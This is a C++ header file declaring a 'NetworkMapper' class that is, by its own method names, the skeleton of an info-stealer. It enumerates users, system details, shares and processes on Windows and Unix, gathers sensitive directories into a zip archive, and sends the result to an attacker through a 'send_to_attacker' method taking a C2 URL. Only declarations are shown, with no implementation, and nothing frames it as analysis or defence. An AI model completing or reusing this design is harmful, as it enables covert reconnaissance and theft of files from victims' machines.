#ifndef NETWORK_MAPPER_H
#define NETWORK_MAPPER_H

#include <string>
#include <fstream>
#include <vector>
#include <filesystem>

namespace fs = std::filesystem;

class NetworkMapper {
private:
    std::string network_log;
    std::ofstream log_file;

    std::string to_lower(const std::string& s);
    bool ends_with(const std::string& str, const std::string& suffix);

    void log(const std::string& category, const std::string& info);

    // Platform-specific collection
#ifdef _WIN32
    void enum_windows_users();
    void enum_windows_system_info();
    void enum_network_shares();
    void enum_processes();
#else
    void enum_unix_users();
    void enum_unix_system_info();
    void enum_unix_shares();
    void enum_unix_processes();
#endif

    void collect_sensitive_directories(std::vector<std::string>& target_paths);
    bool create_zip_archive(const std::vector<std::string>& paths, const std::string& zip_path);

public:
    NetworkMapper();
    ~NetworkMapper();

    void perform_mapping();
    void send_to_attacker(const std::string& c2_url);
};

#endif // NETWORK_MAPPER_H
